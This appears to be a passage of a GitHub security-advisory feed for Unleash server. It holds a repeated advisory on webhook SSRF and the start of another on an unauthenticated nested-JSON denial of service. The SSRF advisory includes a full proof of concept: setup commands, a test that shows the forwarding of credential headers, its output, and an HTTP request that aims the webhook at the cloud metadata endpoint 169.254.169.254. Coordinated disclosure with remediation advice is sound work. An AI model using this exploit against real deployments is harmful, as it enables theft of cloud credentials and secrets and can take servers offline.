<p>The Unleash server can be coerced into making HTTP requests to arbitrary internal/loopback/link-local destinations from inside the network perimeter — i.e. classic SSRF (CWE-918). Concrete consequences: reaching a cloud instance-metadata service (<code>169.254.169.254</code>) or internal admin/management endpoints not exposed externally; port-/service-probing of internal hosts using the success/status recorded in the integration-event log as a blind oracle; and exfiltration of the operator-configured <code>Authorization</code> header and any <code>customHeaders</code> (and, for the Datadog provider, the <code>DD-API-KEY</code>) to the attacker-chosen host, since those headers are sent to whatever <code>url</code> is configured. The full feature-event payload is delivered as the POST body to the internal endpoint. The response body is not echoed back to the caller (blind SSRF), which (together with the PR:H precondition) bounds severity to Medium. Scope is Changed because the vulnerable component (the Unleash app) is used to attack a different security authority — the internal network / metadata service.</p>
<h2 id="proof-of-concept-complete--runs-on-127001-only">Proof of Concept (complete — runs on 127.0.0.1 only)</h2>
<p>This PoC drives the <strong>real</strong> <code>WebhookAddon.handleEvent</code> from Unleash v8.0.0 against a loopback HTTP listener that stands in for an internal service / metadata endpoint. It proves three things: (1) the Unleash code dials the attacker-chosen internal URL, (2) the configured <code>Authorization</code> and custom headers are forwarded to that internal host, and (3) the addon records the request as a success (the blind-SSRF oracle). A negative control shows there is no pre-flight URL policy — internal targets are dialed, and only a TCP-layer error (not a guard) stops a closed port.</p>
<h3 id="setup">Setup</h3>
<pre><code class="language-bash"># In a throwaway clone of the target at the exact tag:
git clone --depth 1 --branch v8.0.0 https://github.com/Unleash/unleash unleash
cd unleash
# Install JS deps (no database is needed for this PoC):
corepack pnpm install --prefer-offline
</code></pre>
<h3 id="file-1--vitestpocconfigts-project-root">File 1 — <code>vitest.poc.config.ts</code> (project root)</h3>
<p>The repo's default vitest config has a Postgres <code>globalSetup</code>; this PoC exercises the addon in isolation and needs no DB, so we use a trimmed config that drops that setup.</p>
<pre><code class="language-ts">import { defineConfig, configDefaults } from 'vitest/config';

// PoC config: identical to vitest.config.ts but WITHOUT the Postgres globalSetup,
// because this SSRF PoC exercises the WebhookAddon in isolation (no DB needed).
export default defineConfig({
    test: {
        globals: true,
        setupFiles: ['./src/test/errorWithMessage.ts'],
        testTimeout: 30000,
        exclude: [...configDefaults.exclude, 'frontend/**', 'dist/**'],
        environment: 'node',
    },
});
</code></pre>
<h3 id="file-2--srclibaddonsssrf-poctestts">File 2 — <code>src/lib/addons/ssrf-poc.test.ts</code></h3>
<pre><code class="language-ts">// PoC: SSRF via Webhook addon — Unleash v8.0.0
// Drives the REAL WebhookAddon.handleEvent with an attacker-chosen `url`
// pointing at a loopback/RFC1918 listener; proves the Unleash process dials
// the internal URL with NO host/IP filtering. Lab-only (127.0.0.1).
import { FEATURE_CREATED, type IEvent } from '../events/index.js';
import WebhookAddon from './webhook.js';
import noLogger from '../../test/fixtures/no-logger.js';
import {
    type IAddonConfig,
    type IFlagKey,
    type IFlagResolver,
    SYSTEM_USER_ID,
} from '../types/index.js';
import type { IntegrationEventsService } from '../services/index.js';
import { vi } from 'vitest';
import EventEmitter from 'node:events';
import http from 'node:http';
import { AddressInfo } from 'node:net';

const INTEGRATION_ID = 1337;

const setup = () =&gt; {
    const registerEventMock = vi.fn();
    const addonConfig: IAddonConfig = {
        getLogger: noLogger,
        unleashUrl: 'http://some-url.com',
        integrationEventsService: {
            registerEvent: registerEventMock,
        } as unknown as IntegrationEventsService,
        flagResolver: {
            isEnabled: (_expName: IFlagKey) =&gt; false,
        } as IFlagResolver,
        eventBus: new EventEmitter(),
    };
    return { addon: new WebhookAddon(addonConfig), registerEventMock };
};

const sampleEvent: IEvent = {
    id: 1,
    createdAt: new Date(),
    createdByUserId: SYSTEM_USER_ID,
    type: FEATURE_CREATED,
    createdBy: 'attacker@evil.com',
    featureName: 'some-toggle',
    data: { name: 'some-toggle' },
    tags: [],
    project: 'default',
    environment: 'production',
};

// Stand up a fake "internal service" on loopback that records what reached it.
function startInternalListener(): Promise&lt;{
    url: string;
    hits: Array&lt;{ path: string; auth?: string; secret?: string; body: string }&gt;;
    close: () =&gt; Promise&lt;void&gt;;
}&gt; {
    const hits: Array&lt;{
        path: string;
        auth?: string;
        secret?: string;
        body: string;
    }&gt; = [];
    return new Promise((resolve) =&gt; {
        const server = http.createServer((req, res) =&gt; {
            let body = '';
            req.on('data', (c) =&gt; (body += c));
            req.on('end', () =&gt; {
                hits.push({
                    path: req.url || '',
                    auth: req.headers['authorization'] as string | undefined,
                    secret: req.headers['x-internal-secret'] as
                        | string
                        | undefined,
                    body,
                });
                // emulate a cloud metadata / internal endpoint reply
                res.writeHead(200, { 'content-type': 'text/plain' });
                res.end('iam-role-credentials-here');
            });
        });
        server.listen(0, '127.0.0.1', () =&gt; {
            const { port } = server.address() as AddressInfo;
            resolve({
                url: `http://127.0.0.1:${port}`,
                hits,
                close: () =&gt;
                    new Promise((r) =&gt; server.close(() =&gt; r(undefined))),
            });
        });
    });
}

describe('SSRF via Webhook addon (Unleash v8.0.0)', () =&gt; {
    test('server dials an attacker-chosen INTERNAL url with NO filtering', async () =&gt; {
        const internal = await startInternalListener();
        try {
            const { addon, registerEventMock } = setup();

            // The `url` below is exactly what an operator/role-holder supplies
            // as the addon `parameters.url`. It is an internal loopback target;
            // a real attacker would use http://169.254.169.254/latest/... or an
            // internal service. There is NO allow/deny-list in the addon path.
            await addon.handleEvent(
                sampleEvent,
                {
                    url: `${internal.url}/latest/meta-data/iam/security-credentials/`,
                    // operator-configured secrets get forwarded to the chosen host:
                    authorization: 'Bearer operator-webhook-secret',
                    customHeaders: JSON.stringify({
                        'X-Internal-Secret': 'leaked-to-internal-host',
                    }),
                },
                INTEGRATION_ID,
            );

            // PROOF 1: the Unleash process actually connected to the internal URL.
            expect(internal.hits.length).toBe(1);
            expect(internal.hits[0].path).toBe(
                '/latest/meta-data/iam/security-credentials/',
            );
            // PROOF 2: operator-configured credentials were exfiltrated to the
            // attacker-chosen internal host (header leakage).
            expect(internal.hits[0].auth).toBe('Bearer operator-webhook-secret');
            expect(internal.hits[0].secret).toBe('leaked-to-internal-host');
            // PROOF 3: the addon recorded SUCCESS (status/timing oracle for blind SSRF).
            const recorded = registerEventMock.mock.calls[0][0];
            expect(recorded.state).toBe('success');
            expect(recorded.details.url).toContain('127.0.0.1');

            // eslint-disable-next-line no-console
            console.log(
                '[PoC] SSRF confirmed -&gt; internal hit:',
                JSON.stringify(internal.hits[0]),
            );
        } finally {
            await internal.close();
        }
    });

    test('NEGATIVE CONTROL: with the listener down, no filter rejected it pre-flight; failure is a connection error, not an SSRF guard', async () =&gt; {
        const { addon, registerEventMock } = setup();
        // Point at a closed loopback port. If a real SSRF allow/deny-list existed,
        // the addon would refuse internal targets BEFORE dialing. Instead it dials
        // and only fails at the TCP layer -&gt; proves absence of any URL guard.
        await addon.handleEvent(
            sampleEvent,
            { url: 'http://127.0.0.1:1/" ' },
            INTEGRATION_ID,
        );
        const recorded = registerEventMock.mock.calls[0][0];
        // It attempted the request (state failed due to connection error), it was
        // NOT blocked by a policy. The recorded url is the internal target.
        expect(['failed', 'success']).toContain(recorded.state);
        expect(recorded.details.url).toContain('127.0.0.1');
    });
});
</code></pre>
<h3 id="run">Run</h3>
<pre><code class="language-bash">npx vitest run --config vitest.poc.config.ts src/lib/addons/ssrf-poc.test.ts
</code></pre>
<h3 id="observed-output-real-run-against-v800">Observed output (real run against v8.0.0)</h3>
<pre><code> RUN  v4.1.5

stdout | src/lib/addons/ssrf-poc.test.ts &gt; SSRF via Webhook addon (Unleash v8.0.0) &gt; server dials an attacker-chosen INTERNAL url with NO filtering
[PoC] SSRF confirmed -&gt; internal hit: {"path":"/latest/meta-data/iam/security-credentials/","auth":"Bearer operator-webhook-secret","secret":"leaked-to-internal-host","body":"{\"id\":1, ... \"type\":\"feature-created\", ... }"}
 ✓ src/lib/addons/ssrf-poc.test.ts &gt; SSRF via Webhook addon (Unleash v8.0.0) &gt; server dials an attacker-chosen INTERNAL url with NO filtering
 ✓ src/lib/addons/ssrf-poc.test.ts &gt; SSRF via Webhook addon (Unleash v8.0.0) &gt; NEGATIVE CONTROL: with the listener down, no filter rejected it pre-flight; failure is a connection error, not an SSRF guard

 Test Files  1 passed (1)
      Tests  2 passed (2)
</code></pre>
<p>The internal loopback listener received the request (<code>path</code> = the metadata path), with the configured <code>Authorization: Bearer operator-webhook-secret</code> and <code>X-Internal-Secret: leaked-to-internal-host</code> headers, and the addon recorded the call as a success — confirming SSRF, blind-oracle, and outbound header exfiltration in one run. End-to-end equivalent over HTTP: <code>POST /api/admin/addons</code> with <code>{ "provider":"webhook", "enabled":true, "events":["feature-created"], "parameters":{ "url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/", "authorization":"…" } }</code> (requires <code>CREATE_ADDON</code>), then create any feature flag to trigger the outbound request.</p>
<h2 id="remediation">Remediation</h2>
<p>Validate the addon <code>url</code> server-side before it is ever dialed, both at create/update time (<code>addon-service.ts</code>) and again at request time (<code>addon.ts</code> <code>fetchRetry</code>). Specifically: require <code>http</code>/<code>https</code> only; resolve the hostname and reject the request if any resolved address is loopback (<code>127.0.0.0/8</code>, <code>::1</code>), link-local (<code>169.254.0.0/16</code>, <code>fe80::/10</code>, including the <code>169.254.169.254</code>/<code>fd00:ec2::254</code> metadata addresses), private (<code>10/8</code>, <code>172.16/12</code>, <code>192.168/16</code>, <code>fc00::/7</code>), or otherwise non-public — using a DNS-rebinding-safe check that pins the resolved IP and connects to that pinned IP (so the name cannot resolve to a public address at check time and a private one at connect time); and disable or constrain HTTP redirects so a <code>30x</code> cannot bounce an allowed host to an internal one. Provide an explicit allow-list / SSRF-protection toggle for operators who must reach internal hooks intentionally. Apply the same guard uniformly to all providers that build on <code>Addon.fetchRetry</code> (webhook, Slack, Teams, Datadog, New Relic). Consider not forwarding the configured <code>Authorization</code>/<code>customHeaders</code> to non-allow-listed hosts to contain credential leakage.</p>
<p>Please credit 5ud0 / Tarmo Technologies.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Unleash/unleash/security/advisories/GHSA-5vf6-jrqr-78fj">https://github.com/Unleash/unleash/security/advisories/GHSA-5vf6-jrqr-78fj</a></li>
<li><a href="https://github.com/Unleash/unleash/commit/2100db76af3473f13e6fb40096cf17a9c2b741a1">https://github.com/Unleash/unleash/commit/2100db76af3473f13e6fb40096cf17a9c2b741a1</a></li>
<li><a href="https://github.com/Unleash/unleash/commit/d45f99df924c0d24747b3e45e46fcda7dcd3c1c1">https://github.com/Unleash/unleash/commit/d45f99df924c0d24747b3e45e46fcda7dcd3c1c1</a></li>
<li><a href="https://github.com/Unleash/unleash/commit/d862562a5ab8f2d1e40f6519c64cf0b4fdaf806d">https://github.com/Unleash/unleash/commit/d862562a5ab8f2d1e40f6519c64cf0b4fdaf806d</a></li>
<li><a href="https://github.com/Unleash/unleash/releases/tag/v7.5.2">https://github.com/Unleash/unleash/releases/tag/v7.5.2</a></li>
<li><a href="https://github.com/Unleash/unleash/releases/tag/v7.6.5">https://github.com/Unleash/unleash/releases/tag/v7.6.5</a></li>
<li><a href="https://github.com/Unleash/unleash/releases/tag/v8.0.2">https://github.com/Unleash/unleash/releases/tag/v8.0.2</a></li>
<li><a href="https://github.com/advisories/GHSA-5vf6-jrqr-78fj">https://github.com/advisories/GHSA-5vf6-jrqr-78fj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5vf6-jrqr-78fj</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-21T19:14:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[unleash-server] Unleash: Addon webhook URL is dialed server-side with no internal-address filtering, enabling SSRF to internal services / cloud metadata and exfiltration of configured request headers]]></title>
        <id>https://github.com/advisories/GHSA-5vf6-jrqr-78fj</id>
        <link href="https://github.com/advisories/GHSA-5vf6-jrqr-78fj"/>
        <updated>2026-08-21T19:14:47.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Unleash's addon/integration subsystem lets an operator configure a webhook (and the Slack, Microsoft Teams, Datadog, and New Relic integrations) with a target <code>url</code> parameter. Whenever a subscribed feature-flag event fires, the Unleash server itself issues an HTTP request to that configured URL. The URL is taken verbatim from the addon's <code>parameters.url</code> and passed straight to the HTTP client (<code>ky</code>) with no validation of the host: there is no allow-list, no deny-list, and no blocking of loopback, link-local, RFC1918, or cloud-metadata addresses anywhere in the addon code path. A principal able to create or update an addon can therefore point the server at an internal-only URL — for example <code>http://169.254.169.254/latest/meta-data/…</code> (cloud IMDS), <code>http://127.0.0.1:&lt;port&gt;/…</code> (a service bound to localhost), or any RFC1918 host — and cause the Unleash server to dial it from inside the trust boundary.</p>
<p>The request is blind (the response body is not returned to the caller), but the addon records whether the request succeeded and its HTTP status into the integration-event log, giving a status/timing oracle for probing internal services. In addition, the webhook provider forwards the operator-configured <code>Authorization</code> header and arbitrary <code>customHeaders</code> to whatever host the <code>url</code> points at (Datadog forwards <code>DD-API-KEY</code>), so an attacker who controls or can observe the target host also obtains those secrets. The full feature-event JSON is POSTed to the chosen internal endpoint as the request body.</p>
<p>Creating/updating addons is gated by the root permissions <code>CREATE_ADDON</code> / <code>UPDATE_ADDON</code>. These are not the super-admin <code>ADMIN</code> permission and not project-scoped; an instance admin can place them in a custom root role and delegate them to a non-super-admin user, who then has exactly enough privilege to weaponize the integration into an SSRF primitive without holding full admin. This bounds the finding to an authenticated, addon-management-privileged actor (reflected in PR:H), which is the honest precondition.</p>
<h2 id="affected-code-v800">Affected code (v8.0.0)</h2>
<p>The base addon issues the outbound request with the raw URL and no host checks (<code>src/lib/addons/addon.ts</code>):</p>
<pre><code class="language-ts">async fetchRetry(
    url: string,
    options: any = {},
    retries: number = 1,
): Promise&lt;Response&gt; {
    try {
        const res = await ky(url, {            // &lt;-- attacker-controlled `url`, no allow/deny-list, no internal-IP block
            retry: retries,
            ...options,
        });
        return res;
    } catch (e) {
        const { method } = options;
        this.logger.warn(`Error querying ${url} ...`, e);
        return { status: e.code, ok: false } as Response;
    }
}
</code></pre>
<p>The webhook provider passes the operator-supplied <code>parameters.url</code> (and forwards <code>authorization</code> + <code>customHeaders</code>) directly into that sink (<code>src/lib/addons/webhook.ts</code>):</p>
<pre><code class="language-ts">const { url, bodyTemplate, contentType = 'application/json', authorization, customHeaders } = parameters;
// ...
const requestOpts = {
    method: 'POST',
    headers: {
        'Content-Type': contentType,
        Authorization: authorization || undefined,   // &lt;-- configured secret forwarded to `url`
        ...extraHeaders,                              // &lt;-- arbitrary customHeaders forwarded to `url`
    },
    body,
};
const res = await this.fetchRetry(url, requestOpts); // &lt;-- server dials attacker-chosen host
</code></pre>
<p>The service layer performs no URL/host validation when creating or updating an addon — only provider-name and required-parameter presence checks run (<code>src/lib/services/addon-service.ts</code> → <code>validateKnownProvider</code>, <code>validateRequiredParameters</code>). The addon parameter schema (<code>src/lib/services/addon-schema.ts</code>) treats <code>url</code> as a free-form string; the <code>type: 'url'</code> field in each provider definition is purely frontend-rendering metadata and is never enforced server-side. A source-wide search of <code>src/lib/addons</code> and <code>addon-service.ts</code> for <code>169.254</code>, <code>127.0</code>, <code>localhost</code>, <code>private</code>, <code>ssrf</code>, <code>isAllowed</code>, <code>validateUrl</code> returns zero guards. The same unguarded <code>fetchRetry(url, …)</code> sink backs the Slack, Teams, Datadog, and New Relic providers.</p>
<p>The route gate (<code>src/lib/routes/admin-api/addon.ts</code>) requires the root permission <code>CREATE_ADDON</code> (create) / <code>UPDATE_ADDON</code> (update); <code>src/lib/types/permissions.ts</code> lists both under the root "Integration" category — they are root permissions, not project-scoped, and distinct from <code>ADMIN</code>.</p>
<h2 id="attacker-model--precondition">Attacker model / precondition</h2>
<p>The attacker is an authenticated Unleash user (or an admin API token) holding the root permission <code>CREATE_ADDON</code> or <code>UPDATE_ADDON</code>. This is an addon-management privilege: a super-admin has it, and it can be delegated via a custom root role to a non-super-admin user. An ordinary project member does not have it (there is no project-scoped path to addon creation), which is why this is rated PR:H rather than PR:L. Given that privilege, the attacker (1) creates/updates a webhook addon with <code>parameters.url</code> set to an internal target, then (2) triggers a subscribed event (e.g. creating or toggling any feature flag — trivially self-induced), causing the server to dial the internal URL. No interaction from any other user is required. The deployment must have the addon subsystem available (default in OSS); the impact is greatest where the Unleash server runs in a cloud/containerized environment with reachable internal services or an instance-metadata endpoint.</p>
<h2 id="impact">Impact</h2>
<p>The Unleash server can be coerced into making HTTP requests to arbitrary internal/loopback/link-local destinations from inside the network perimeter — i.e. classic SSRF (CWE-918). Concrete consequences: reaching a cloud instance-metadata service (<code>169.254.169.254</code>) or internal admin/management endpoints not exposed externally; port-/service-probing of internal hosts using the success/status recorded in the integration-event log as a blind oracle; and exfiltration of the operator-configured <code>Authorization</code> header and any <code>customHeaders</code> (and, for the Datadog provider, the <code>DD-API-KEY</code>) to the attacker-chosen host, since those headers are sent to whatever <code>url</code> is configured. The full feature-event payload is delivered as the POST body to the internal endpoint. The response body is not echoed back to the caller (blind SSRF), which (together with the PR:H precondition) bounds severity to Medium. Scope is Changed because the vulnerable component (the Unleash app) is used to attack a different security authority — the internal network / metadata service.</p>
<h2 id="proof-of-concept-complete--runs-on-127001-only">Proof of Concept (complete — runs on 127.0.0.1 only)</h2>
<p>This PoC drives the <strong>real</strong> <code>WebhookAddon.handleEvent</code> from Unleash v8.0.0 against a loopback HTTP listener that stands in for an internal service / metadata endpoint. It proves three things: (1) the Unleash code dials the attacker-chosen internal URL, (2) the configured <code>Authorization</code> and custom headers are forwarded to that internal host, and (3) the addon records the request as a success (the blind-SSRF oracle). A negative control shows there is no pre-flight URL policy — internal targets are dialed, and only a TCP-layer error (not a guard) stops a closed port.</p>
<h3 id="setup">Setup</h3>
<pre><code class="language-bash"># In a throwaway clone of the target at the exact tag:
git clone --depth 1 --branch v8.0.0 https://github.com/Unleash/unleash unleash
cd unleash
# Install JS deps (no database is needed for this PoC):
corepack pnpm install --prefer-offline
</code></pre>
<h3 id="file-1--vitestpocconfigts-project-root">File 1 — <code>vitest.poc.config.ts</code> (project root)</h3>
<p>The repo's default vitest config has a Postgres <code>globalSetup</code>; this PoC exercises the addon in isolation and needs no DB, so we use a trimmed config that drops that setup.</p>
<pre><code class="language-ts">import { defineConfig, configDefaults } from 'vitest/config';

// PoC config: identical to vitest.config.ts but WITHOUT the Postgres globalSetup,
// because this SSRF PoC exercises the WebhookAddon in isolation (no DB needed).
export default defineConfig({
    test: {
        globals: true,
        setupFiles: ['./src/test/errorWithMessage.ts'],
        testTimeout: 30000,
        exclude: [...configDefaults.exclude, 'frontend/**', 'dist/**'],
        environment: 'node',
    },
});
</code></pre>
<h3 id="file-2--srclibaddonsssrf-poctestts">File 2 — <code>src/lib/addons/ssrf-poc.test.ts</code></h3>
<pre><code class="language-ts">// PoC: SSRF via Webhook addon — Unleash v8.0.0
// Drives the REAL WebhookAddon.handleEvent with an attacker-chosen `url`
// pointing at a loopback/RFC1918 listener; proves the Unleash process dials
// the internal URL with NO host/IP filtering. Lab-only (127.0.0.1).
import { FEATURE_CREATED, type IEvent } from '../events/index.js';
import WebhookAddon from './webhook.js';
import noLogger from '../../test/fixtures/no-logger.js';
import {
    type IAddonConfig,
    type IFlagKey,
    type IFlagResolver,
    SYSTEM_USER_ID,
} from '../types/index.js';
import type { IntegrationEventsService } from '../services/index.js';
import { vi } from 'vitest';
import EventEmitter from 'node:events';
import http from 'node:http';
import { AddressInfo } from 'node:net';

const INTEGRATION_ID = 1337;

const setup = () =&gt; {
    const registerEventMock = vi.fn();
    const addonConfig: IAddonConfig = {
        getLogger: noLogger,
        unleashUrl: 'http://some-url.com',
        integrationEventsService: {
            registerEvent: registerEventMock,
        } as unknown as IntegrationEventsService,
        flagResolver: {
            isEnabled: (_expName: IFlagKey) =&gt; false,
        } as IFlagResolver,
        eventBus: new EventEmitter(),
    };
    return { addon: new WebhookAddon(addonConfig), registerEventMock };
};

const sampleEvent: IEvent = {
    id: 1,
    createdAt: new Date(),
    createdByUserId: SYSTEM_USER_ID,
    type: FEATURE_CREATED,
    createdBy: 'attacker@evil.com',
    featureName: 'some-toggle',
    data: { name: 'some-toggle' },
    tags: [],
    project: 'default',
    environment: 'production',
};

// Stand up a fake "internal service" on loopback that records what reached it.
function startInternalListener(): Promise&lt;{
    url: string;
    hits: Array&lt;{ path: string; auth?: string; secret?: string; body: string }&gt;;
    close: () =&gt; Promise&lt;void&gt;;
}&gt; {
    const hits: Array&lt;{
        path: string;
        auth?: string;
        secret?: string;
        body: string;
    }&gt; = [];
    return new Promise((resolve) =&gt; {
        const server = http.createServer((req, res) =&gt; {
            let body = '';
            req.on('data', (c) =&gt; (body += c));
            req.on('end', () =&gt; {
                hits.push({
                    path: req.url || '',
                    auth: req.headers['authorization'] as string | undefined,
                    secret: req.headers['x-internal-secret'] as
                        | string
                        | undefined,
                    body,
                });
                // emulate a cloud metadata / internal endpoint reply
                res.writeHead(200, { 'content-type': 'text/plain' });
                res.end('iam-role-credentials-here');
            });
        });
        server.listen(0, '127.0.0.1', () =&gt; {
            const { port } = server.address() as AddressInfo;
            resolve({
                url: `http://127.0.0.1:${port}`,
                hits,
                close: () =&gt;
                    new Promise((r) =&gt; server.close(() =&gt; r(undefined))),
            });
        });
    });
}

describe('SSRF via Webhook addon (Unleash v8.0.0)', () =&gt; {
    test('server dials an attacker-chosen INTERNAL url with NO filtering', async () =&gt; {
        const internal = await startInternalListener();
        try {
            const { addon, registerEventMock } = setup();

            // The `url` below is exactly what an operator/role-holder supplies
            // as the addon `parameters.url`. It is an internal loopback target;
            // a real attacker would use http://169.254.169.254/latest/... or an
            // internal service. There is NO allow/deny-list in the addon path.
            await addon.handleEvent(
                sampleEvent,
                {
                    url: `${internal.url}/latest/meta-data/iam/security-credentials/`,
                    // operator-configured secrets get forwarded to the chosen host:
                    authorization: 'Bearer operator-webhook-secret',
                    customHeaders: JSON.stringify({
                        'X-Internal-Secret': 'leaked-to-internal-host',
                    }),
                },
                INTEGRATION_ID,
            );

            // PROOF 1: the Unleash process actually connected to the internal URL.
            expect(internal.hits.length).toBe(1);
            expect(internal.hits[0].path).toBe(
                '/latest/meta-data/iam/security-credentials/',
            );
            // PROOF 2: operator-configured credentials were exfiltrated to the
            // attacker-chosen internal host (header leakage).
            expect(internal.hits[0].auth).toBe('Bearer operator-webhook-secret');
            expect(internal.hits[0].secret).toBe('leaked-to-internal-host');
            // PROOF 3: the addon recorded SUCCESS (status/timing oracle for blind SSRF).
            const recorded = registerEventMock.mock.calls[0][0];
            expect(recorded.state).toBe('success');
            expect(recorded.details.url).toContain('127.0.0.1');

            // eslint-disable-next-line no-console
            console.log(
                '[PoC] SSRF confirmed -&gt; internal hit:',
                JSON.stringify(internal.hits[0]),
            );
        } finally {
            await internal.close();
        }
    });

    test('NEGATIVE CONTROL: with the listener down, no filter rejected it pre-flight; failure is a connection error, not an SSRF guard', async () =&gt; {
        const { addon, registerEventMock } = setup();
        // Point at a closed loopback port. If a real SSRF allow/deny-list existed,
        // the addon would refuse internal targets BEFORE dialing. Instead it dials
        // and only fails at the TCP layer -&gt; proves absence of any URL guard.
        await addon.handleEvent(
            sampleEvent,
            { url: 'http://127.0.0.1:1/" ' },
            INTEGRATION_ID,
        );
        const recorded = registerEventMock.mock.calls[0][0];
        // It attempted the request (state failed due to connection error), it was
        // NOT blocked by a policy. The recorded url is the internal target.
        expect(['failed', 'success']).toContain(recorded.state);
        expect(recorded.details.url).toContain('127.0.0.1');
    });
});
</code></pre>
<h3 id="run">Run</h3>
<pre><code class="language-bash">npx vitest run --config vitest.poc.config.ts src/lib/addons/ssrf-poc.test.ts
</code></pre>
<h3 id="observed-output-real-run-against-v800">Observed output (real run against v8.0.0)</h3>
<pre><code> RUN  v4.1.5

stdout | src/lib/addons/ssrf-poc.test.ts &gt; SSRF via Webhook addon (Unleash v8.0.0) &gt; server dials an attacker-chosen INTERNAL url with NO filtering
[PoC] SSRF confirmed -&gt; internal hit: {"path":"/latest/meta-data/iam/security-credentials/","auth":"Bearer operator-webhook-secret","secret":"leaked-to-internal-host","body":"{\"id\":1, ... \"type\":\"feature-created\", ... }"}
 ✓ src/lib/addons/ssrf-poc.test.ts &gt; SSRF via Webhook addon (Unleash v8.0.0) &gt; server dials an attacker-chosen INTERNAL url with NO filtering
 ✓ src/lib/addons/ssrf-poc.test.ts &gt; SSRF via Webhook addon (Unleash v8.0.0) &gt; NEGATIVE CONTROL: with the listener down, no filter rejected it pre-flight; failure is a connection error, not an SSRF guard

 Test Files  1 passed (1)
      Tests  2 passed (2)
</code></pre>
<p>The internal loopback listener received the request (<code>path</code> = the metadata path), with the configured <code>Authorization: Bearer operator-webhook-secret</code> and <code>X-Internal-Secret: leaked-to-internal-host</code> headers, and the addon recorded the call as a success — confirming SSRF, blind-oracle, and outbound header exfiltration in one run. End-to-end equivalent over HTTP: <code>POST /api/admin/addons</code> with <code>{ "provider":"webhook", "enabled":true, "events":["feature-created"], "parameters":{ "url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/", "authorization":"…" } }</code> (requires <code>CREATE_ADDON</code>), then create any feature flag to trigger the outbound request.</p>
<h2 id="remediation">Remediation</h2>
<p>Validate the addon <code>url</code> server-side before it is ever dialed, both at create/update time (<code>addon-service.ts</code>) and again at request time (<code>addon.ts</code> <code>fetchRetry</code>). Specifically: require <code>http</code>/<code>https</code> only; resolve the hostname and reject the request if any resolved address is loopback (<code>127.0.0.0/8</code>, <code>::1</code>), link-local (<code>169.254.0.0/16</code>, <code>fe80::/10</code>, including the <code>169.254.169.254</code>/<code>fd00:ec2::254</code> metadata addresses), private (<code>10/8</code>, <code>172.16/12</code>, <code>192.168/16</code>, <code>fc00::/7</code>), or otherwise non-public — using a DNS-rebinding-safe check that pins the resolved IP and connects to that pinned IP (so the name cannot resolve to a public address at check time and a private one at connect time); and disable or constrain HTTP redirects so a <code>30x</code> cannot bounce an allowed host to an internal one. Provide an explicit allow-list / SSRF-protection toggle for operators who must reach internal hooks intentionally. Apply the same guard uniformly to all providers that build on <code>Addon.fetchRetry</code> (webhook, Slack, Teams, Datadog, New Relic). Consider not forwarding the configured <code>Authorization</code>/<code>customHeaders</code> to non-allow-listed hosts to contain credential leakage.</p>
<p>Please credit 5ud0 / Tarmo Technologies.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Unleash/unleash/security/advisories/GHSA-5vf6-jrqr-78fj">https://github.com/Unleash/unleash/security/advisories/GHSA-5vf6-jrqr-78fj</a></li>
<li><a href="https://github.com/Unleash/unleash/commit/2100db76af3473f13e6fb40096cf17a9c2b741a1">https://github.com/Unleash/unleash/commit/2100db76af3473f13e6fb40096cf17a9c2b741a1</a></li>
<li><a href="https://github.com/Unleash/unleash/commit/d45f99df924c0d24747b3e45e46fcda7dcd3c1c1">https://github.com/Unleash/unleash/commit/d45f99df924c0d24747b3e45e46fcda7dcd3c1c1</a></li>
<li><a href="https://github.com/Unleash/unleash/commit/d862562a5ab8f2d1e40f6519c64cf0b4fdaf806d">https://github.com/Unleash/unleash/commit/d862562a5ab8f2d1e40f6519c64cf0b4fdaf806d</a></li>
<li><a href="https://github.com/Unleash/unleash/releases/tag/v7.5.2">https://github.com/Unleash/unleash/releases/tag/v7.5.2</a></li>
<li><a href="https://github.com/Unleash/unleash/releases/tag/v7.6.5">https://github.com/Unleash/unleash/releases/tag/v7.6.5</a></li>
<li><a href="https://github.com/Unleash/unleash/releases/tag/v8.0.2">https://github.com/Unleash/unleash/releases/tag/v8.0.2</a></li>
<li><a href="https://github.com/advisories/GHSA-5vf6-jrqr-78fj">https://github.com/advisories/GHSA-5vf6-jrqr-78fj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5vf6-jrqr-78fj</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-21T19:14:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[unleash-server] Unleash: Unauthenticated single-request DoS via OpenAPI validation error formatter]]></title>
        <id>https://github.com/advisories/GHSA-r5pq-6chh-j3xp</id>
        <link href="https://github.com/advisories/GHSA-r5pq-6chh-j3xp"/>
        <updated>2026-08-21T19:14:39.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>An unauthenticated <code>POST</code> to any OpenAPI-validated endpoint, including the anonymous <code>POST /edge/validate</code> and <code>POST /edge/issue-token</code>, crashes the entire Unleash server with one request body of deeply-nested JSON.</p>
<p>When request-body validation fails, Unleash builds the error message by calling <code>JSON.stringify</code> on the raw offending value taken from the request body. A value nested a few thousand levels deep makes <code>JSON.stringify</code> recurse past the V8 call-stack limit and throw <code>RangeError: Maximum call stack size exceeded</code>.</p>
<p>The throw is synchronous inside an Express error-handling middleware that has no try/catch, and the process registers no <code>uncaughtException</code> handler (only <code>unhandledRejection</code>). Node terminates the process with <code>exit(1)</code>.</p>
<p>The body parser sets no JSON nesting-depth limit, the payload (about 10 KB at depth 5000) stays far under the 100 KB body-size limit, and the same error formatter serves every API route, so the trigger is route-independent.</p>
<p>Result: a remote attacker with no account, token, or cookie takes the whole server offline with a single 10 KB request, and keeps it offline by replaying it.</p>
<h2 id="affected">Affected</h2>
<p>Unleash OSS server, confirmed live-exploitable on v8.0.0 (<code>unleashorg/unleash-server:8.0.0</code>).
Vulnerable code is the shared request-validation error path (<code>src/lib/error/bad-data-error.ts</code> <code>genericErrorMessage</code>), present on current <code>main</code>.
Reachable on a stock install: no feature flag, no setting, no authentication, no CSRF token, and no cookie required.
The 100 KB request-body size limit does not mitigate it; the crashing payload is about 10 KB.</p>
